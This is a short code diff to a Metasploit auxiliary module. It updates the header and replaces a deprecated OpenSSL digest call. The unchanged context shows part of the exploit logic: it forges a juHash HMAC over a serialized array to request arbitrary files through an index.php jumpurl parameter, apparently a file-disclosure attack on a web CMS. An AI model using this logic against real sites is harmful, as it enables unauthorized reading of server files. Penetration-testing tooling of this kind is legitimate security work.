@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -143,7 +141,7 @@ class Metasploit4 < Msf::Auxiliary
       juarray = "a:3:{i:0;s:#{jumpurl_len.to_s()}:\"#{jumpurl_enc}\""
       juarray << ";i:1;s:#{locationData.length}:\"#{locationData}\";i:2;"
       juarray << "s:0:\"\";}"
-      juhash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::Digest.new('sha1'), enc_key, juarray)
+      juhash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('sha1'), enc_key, juarray)
     end
 
     file_uri = "#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
